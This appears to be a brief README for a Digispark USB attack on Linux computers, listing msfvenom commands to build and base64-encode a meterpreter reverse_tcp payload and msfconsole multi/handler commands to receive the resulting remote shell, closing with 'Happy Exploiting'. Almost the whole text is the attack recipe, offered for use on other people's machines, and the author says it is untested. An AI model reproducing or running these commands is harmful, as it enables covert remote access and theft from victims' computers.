### Note this is for getting into linux computers this will not work on a windows computer. Also this has not been tested so may work or may not

## How to use:

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOURIP LPORT=880 -f elf > mShell_880`


`base64 mShell_880 > mShell_880.b64`

Copy the base64 code thing into the digispark code.


New terminal window: 


`sudo msfconsole`


`use multi/handler`


`set PAYLOAD linux/x86/meterpreter/reverse_tcp`


`set LHOST YOURIP`


`set LPORT 880`


`set AutoRunScript multi_console_command -rc /root/autoruncommands.rc`


`exploit`


Then upload the new digispark code onto it and done! Happy Exploiting.
